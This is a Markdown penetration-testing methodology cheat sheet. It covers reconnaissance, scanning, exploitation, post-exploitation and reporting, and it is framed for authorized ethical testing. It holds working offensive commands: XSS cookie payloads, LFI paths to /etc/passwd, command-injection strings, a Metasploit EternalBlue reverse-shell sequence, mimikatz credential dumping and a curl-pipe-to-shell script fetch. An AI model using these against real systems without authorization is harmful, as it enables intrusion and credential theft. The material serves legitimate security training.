# Penetration Testing Methodology

> A structured approach to ethical hacking. Always operate within scope and with written permission.

---

## Phases Overview

```
1. Reconnaissance  →  2. Scanning  →  3. Exploitation  →  4. Post-Exploitation  →  5. Reporting
```

---

## Phase 1 — Reconnaissance

### Passive Recon (no direct contact with target)
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
dnsrecon -d target.com
dnsenum target.com

# Find subdomains
sublist3r -d target.com
amass enum -d target.com
assetfinder --subs-only target.com

# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com "index of"
intitle:"login" site:target.com

# Shodan
shodan search hostname:target.com
shodan host <ip>

# theHarvester - emails, names, subdomains
theHarvester -d target.com -b google,linkedin,shodan
```

### Active Recon (direct contact)
```bash
# DNS zone transfer attempt
dig axfr @ns1.target.com target.com

# Web crawling
gospider -s https://target.com -o output
katana -u https://target.com
```

---

## Phase 2 — Scanning & Enumeration

### Network Scanning
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Full port scan
nmap -sV -sC -p- target.com

# Aggressive scan
nmap -A -T4 target.com

# UDP scan
nmap -sU --top-ports 100 target.com

# Vulnerability scripts
nmap --script vuln target.com
```

### Web Application Scanning
```bash
# Directory/file enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -w wordlist.txt -u https://target.com/FUZZ

# Technology fingerprinting
whatweb https://target.com
wappalyzer (browser extension)

# Nikto web scanner
nikto -h https://target.com

# Parameter discovery
arjun -u https://target.com/api/endpoint
```

---

## Phase 3 — Exploitation

### Web Exploits
```bash
# SQL Injection
sqlmap -u "https://target.com/?id=1" --dbs --batch

# XSS testing
# Payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(document.cookie)</script>

# LFI (Local File Inclusion)
https://target.com/page.php?file=../../../../etc/passwd
https://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Command Injection
; whoami
| id
`id`
$(id)
```

### Network Exploits
```bash
# Metasploit
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
run
```

---

## Phase 4 — Post-Exploitation

### Windows
```bash
# Privilege escalation check
whoami /priv
systeminfo
net localgroup administrators

# Dump credentials
hashdump  # (Metasploit)
mimikatz # "privilege::debug" "sekurlsa::logonpasswords"

# Lateral movement
net use \\target\C$ /user:domain\user password
```

### Linux
```bash
# Privilege escalation
sudo -l
find / -perm -u=s -type f 2>/dev/null  # SUID binaries
cat /etc/crontab
uname -a  # kernel version

# LinPEAS automated check
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## Phase 5 — Reporting

### Report Structure
1. **Executive Summary** — business impact, risk rating
2. **Scope & Methodology** — what was tested, how
3. **Findings** — each vulnerability with:
   - Title & severity (Critical/High/Medium/Low/Info)
   - Description
   - Steps to reproduce
   - Evidence (screenshots, output)
   - Remediation recommendation
4. **Risk Matrix**
5. **Appendix** — tools used, raw output

### Severity Ratings (CVSS)
| Severity | CVSS Score |
|---|---|
| Critical | 9.0 – 10.0 |
| High | 7.0 – 8.9 |
| Medium | 4.0 – 6.9 |
| Low | 0.1 – 3.9 |
| Info | 0.0 |

---

## Essential Tools List

| Category | Tools |
|---|---|
| Recon | Amass, Subfinder, theHarvester, Shodan |
| Scanning | Nmap, Nikto, Gobuster, FFUF |
| Web Testing | Burp Suite, OWASP ZAP |
| Exploitation | Metasploit, SQLmap |
| Password | Hashcat, John, Hydra |
| Post-Exploit | Mimikatz, LinPEAS, WinPEAS |
| Reporting | Dradis, Serpico |
